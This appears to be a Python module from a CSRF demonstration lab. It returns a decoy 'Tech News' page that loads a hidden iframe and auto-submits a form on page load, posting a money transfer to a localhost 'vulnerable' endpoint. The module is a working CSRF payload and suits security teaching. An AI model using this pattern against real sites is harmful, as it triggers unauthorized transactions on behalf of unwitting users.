"""
Attack Scenario: Iframe with POST Request
Attack page using iframe with POST request
"""
def attack_iframe_post():
    """Attack page using iframe with POST request"""
    return """
    <h1>Latest Tech News & Updates</h1>
    <p>Stay informed with the latest technology trends and news!</p>
    <img src="https://via.placeholder.com/600x400?text=Tech+News" alt="Technology News">
    <p>Read more articles below...</p>
    <!-- Hidden iframe that contains a form which auto-submits to trigger CSRF attack -->
    <iframe id="ifrm" src="/attack/form_submit" style="display:none;"></iframe>
    <script>
        window.onload = function() {
            var iframe = document.getElementById('ifrm');
            iframe.contentWindow.document.getElementById('attackForm').submit();
        }
    </script>
    <p><em>This page demonstrates a CSRF attack using a hidden iframe. The iframe contains a form that automatically submits a POST request.</em></p>
    """


def attack_form_submit():
    """Hidden form for iframe attack"""
    return """
    <form id="attackForm" method="POST" 
          action="http://localhost:5000/vulnerable/transfer_post">
        <input type="text" name="txtFromAccount" value="Arvin">
        <input type="text" name="txtTargetAccount" value="Channy">
        <input type="text" name="txtTransferMoney" value="100">
    </form>
    """

